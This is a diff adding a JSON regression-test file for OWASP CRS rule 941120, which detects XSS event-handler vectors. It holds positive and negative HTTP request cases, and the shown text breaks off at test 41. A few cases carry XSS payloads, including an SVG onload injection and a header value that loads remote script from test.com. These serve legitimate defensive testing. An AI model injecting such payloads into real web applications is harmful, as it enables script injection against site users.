@@ -1,0 +1,1616 @@
+[
+  {
+    "name": "CRS 941120-1: XSS Filter - Category 2: Event Handler Vector",
+    "method": "POST",
+    "uri": "/post?%20%20onload%3d%20=vardata",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "0"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-2: XSS Filter - Category 2: Event Handler Vector",
+    "method": "POST",
+    "uri": "/post?%20%20onabcdefgh%3d%20=vardata",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "0"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-3: XSS Filter - Category 2: Event Handler Vector",
+    "method": "POST",
+    "uri": "/post?%20%20onab%3d%20=vardata",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "0"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-4: XSS Filter - Category 2: Event Handler Vector - now a positive test after updating lenght to 50",
+    "method": "POST",
+    "uri": "/post?%20%20onabcdefghijklmnopqrstuvwxyz%3d%20=vardata",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "0"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-5: XSS Filter - Category 2: Event Handler Vector",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "Cookie",
+        "FCNEC=[[\"AKsRol96Mxyk9FqhFojBc6fQqh-bo-s0VYkniISe0wOz3NRAr90HMsu ZQ81FJitWrfPRF09u-aYlhT0PMzLHW-cwgE2c_bmkaerz5Ht3N2y-Tseg5C_ngXVXK2eHiHVfBdx8iAtcRpqNdws_RZwZarM8E0ONvOztHg==\"]]"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-6: SVG onload injection in filename",
+    "method": "GET",
+    "uri": "/get/index.php/%3Csvg/onload=alert()",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-7: Test longer event name onwebkitplaybacktargetavailabilitychanged",
+    "method": "GET",
+    "uri": "/get?%20%20onwebkitplaybacktargetavailabilitychanged%3d%20=vardata",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-8: Negative test: word longer than 50 chars (excluding leading 'on') - onthisisaverylongwordthathasmorethanfiftycharactersss (51 chars)",
+    "method": "GET",
+    "uri": "/get?%20%20onthisisaverylongwordthathasmorethanfiftycharactersss%3d%20=vardata",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-9: Negative test: base64 - previous regex got false positive on these ones",
+    "method": "GET",
+    "uri": "/get?sign=VGhhbmtzLCBmb3IgYWxsIHlvdXIgd29yayBzaW5jZSB5ZWFycyBvbiBDUlMuIEh1bQo%2Fonafe%3D",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-10: Expected (rare) false positive: Stripe webhook signature header",
+    "method": "POST",
+    "uri": "/webhook/stripe",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Stripe-Signature",
+        "t=1614308115,v1=5257a869e7ecebeda32affa62cdca3fa51onabcd=6yJV_adQssw5c"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "77"
+      ]
+    ],
+    "body": "%7B%22id%22%3A%22evt_test%22%2C%22type%22%3A%22payment_intent.succeeded%22%7D",
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-11: Negative test: PayPal IPN callback with transaction hash",
+    "method": "POST",
+    "uri": "/ipn/paypal",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "PayPal IPN"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "240"
+      ]
+    ],
+    "body": "mc_gross=19.95&protection_eligibility=Eligible&payer_id=TESTBUYER&payment_date=12%3A34%3A56+Jan+25+2026&payment_status=Completed&txn_id=1AB23456CD789012E&transaction_subject=Payment&verify_sign=AFcWxV21C7fd0v3bYYYRCpSSRl31A.8h7mKqR9sT5wN%3D",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-12: Expected (rare) false positive: JWT token in Authorization header",
+    "method": "GET",
+    "uri": "/api/payment/status",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Authorization",
+        "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0onload=.POstGet_K5DGFLJrRyhshDZI"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-13: Expected (rare) false positive: Square webhook signature with HMAC-SHA256",
+    "method": "POST",
+    "uri": "/webhook/square",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Square Webhook"
+      ],
+      [
+        "X-Square-Signature",
+        "1a2b3c4d5e6f7g8h9i0j1k2l3m4n5onabcde=6p7q8r9s0t"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "144"
+      ]
+    ],
+    "body": "%7B%22merchant_id%22%3A%22MLEFBHHSJGVHD%22%2C%22type%22%3A%22payment.updated%22%2C%22event_id%22%3A%22c3c5b7de-8ac9-4f86-9c49-0b6dee85f7d8%22%7D",
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-14: Negative test: Adyen payment callback with merchant signature",
+    "method": "POST",
+    "uri": "/webhook/adyen",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "182"
+      ]
+    ],
+    "body": "merchantReference=TEST_ORDER_12345&skinCode=X7hsNDWp&shopperLocale=en_GB&paymentMethod=visa&authResult=AUTHORISED&pspReference=8535296475213845&merchantSig=h5xb3Qm7Yp9Lkd2Wf8Rg4Jv6Tn",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-15: Negative test: Braintree webhook with bt_signature containing base64url",
+    "method": "POST",
+    "uri": "/webhook/braintree",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "78"
+      ]
+    ],
+    "body": "bt_signature=MIIGSAIBAzCCBgwGCSqGSIb3DQEHAaCCBf0EggX5MIIF9TCCBfEGCSqonefgh%3Di",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-16: Negative test: OAuth2 access token in request body",
+    "method": "POST",
+    "uri": "/payment/process",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "101"
+      ]
+    ],
+    "body": "grant_type=authorization_code&code=xyz123&access_token=ya29.a0AfH6SMBx7QkVm3TpWz8RiPQzNsK1Dv%3D2DqE3F",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-17: Negative test: Merchant reference with session token base64",
+    "method": "POST",
+    "uri": "/checkout",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "100"
+      ]
+    ],
+    "body": "order_id=ORD-2026-01-25&confirmation_code=CONF-ABC123XYZ&session_token=sess_1a2b3c4Xm7Yp9Qn5Rt8Wk%3D",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-18: Negative test: RSA signature in PEM format URL-encoded",
+    "method": "POST",
+    "uri": "/api/callback",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "74"
+      ]
+    ],
+    "body": "signature=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2Xm7YpLk9Qw3Rt8Vf6Jn",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-19: Negative test: Payment gateway JSON webhook with nested transaction data",
+    "method": "POST",
+    "uri": "/webhook/payment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "application/json"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "164"
+      ]
+    ],
+    "body": "{\"event\":\"payment.succeeded\",\"data\":{\"transaction_id\":\"txn_1ABC2Xm7YpLk9Qw3DEF4\",\"amount\":5000,\"currency\":\"USD\",\"signature\":\"hmac-sha256=5f7g8h9i0j1k2Wm3Rt5Vp9Ys\"}}",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-20: Negative test: Authorize.net SIM hash with MD5",
+    "method": "POST",
+    "uri": "/payment/authnet/relay",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "144"
+      ]
+    ],
+    "body": "x_response_code=1&x_response_reason_code=1&x_response_reason_text=Approved&x_trans_id=40011019799&x_MD5_Hash=8A7BCF1D2E3F4A5B6C7D8E9Xm3Yp7Wk1F2A",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-21: Negative test: Multiple payment parameters with base64 data ending in equals",
+    "method": "POST",
+    "uri": "/payment/callback",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "145"
+      ]
+    ],
+    "body": "merchant_id=12345&transaction_hash=aGVsbG93b3JsZA%3D%3D&verification_token=ZXhhbXBsZXRva2VuaGVyZQ%3D%3D&confirmation=Y29uZmlybWF0aW9uY29kZQ%3D%3D",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-22: Negative test: Apple Pay payment token with base64 encoded signature",
+    "method": "POST",
+    "uri": "/payment/applepay",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "application/json"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "185"
+      ]
+    ],
+    "body": "{\"paymentData\":{\"version\":\"EC_v1\",\"data\":\"encrypted_data_here\",\"signature\":\"MIAGCSqGSIb3DQonabcdefgh=HIJAoGBAMIIBrTCCA\",\"header\":{\"ephemeralPublicKey\":\"MFkwEwYHKoZIzj0CAQYonefghij=k\"}}}",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-23: Negative test: Google Pay encrypted payment data",
+    "method": "POST",
+    "uri": "/payment/googlepay",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "application/json"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Connection",
+        "close"
+      ],
+      [
+        "Content-Length",
+        "141"
+      ]
+    ],
+    "body": "{\"signature\":\"MEUCIQDXm7Yp9Lk5Rt8Wf3Jn2Qv6Tn\",\"protocolVersion\":\"ECv2\",\"signedMessage\":\"{\\\"encryptedMessage\\\":\\\"Base64Encoded3RandStr1ng\\\"}\"}",
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-24: Test on HTTP header",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Remote-ip",
+        "' onselect=alert(1) '"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-25: Test on HTTP header",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Remote-ip",
+        "' onselect=$.getScript('//test.com') '"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-26: Negative test: Valid User-Agent with Chrome version number",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-27: Negative test: Valid User-Agent with Electron framework",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Electron/23.0.0"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-28: Negative test: Valid User-Agent with Amazon Silk browser",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Silk/89.4.7 like Chrome/89.0.4389.72 Safari/537.36"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-29: Negative test: Valid User-Agent with SamsungBrowser",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-30: Negative test: Valid User-Agent with Version token (Safari)",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-31: Negative test: Valid User-Agent with EdgiOS token",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 EdgiOS/116.0.1938.72 Mobile/15E148 Safari/605.1.15"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-32: Negative test: Valid User-Agent with CriOS (Chrome iOS)",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-33: Negative test: Valid User-Agent with FxiOS (Firefox iOS)",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/121.0 Mobile/15E148 Safari/605.1.15"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-34: Negative test: Valid User-Agent with Opera/OPR token",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-35: Negative test: Valid User-Agent with Monero-related bot",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "Moneroprice/1.0 (+https://example.com/bot)"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-36: Negative test: Valid Referer with query parameters",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://example.com/page?version=1.0&action=view"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-37: Negative test: Valid Referer with version parameter",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://shop.example.com/products?version=premium&option=deluxe"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-38: Negative test: Valid Referer with amazon.com domain",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://www.amazon.com/products/electronics"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-39: Negative test: Valid Referer with section fragment",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://docs.example.com/guide#section=introduction"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-40: Negative test: Valid Referer with action parameter",
+    "method": "GET",
+    "uri": "/get",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "OWASP CRS test agent"
+      ],
+      [
+        "Accept",
+        "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
+      ],
+      [
+        "Referer",
+        "https://app.example.com/dashboard?action=edit&id=123"
+      ],
+      [
+        "Connection",
+        "close"
+      ]
+    ],
+    "no_expect_ids": [
+      941120
+    ]
+  },
+  {
+    "name": "CRS 941120-41: Negative test: Valid Referer with position parameter",
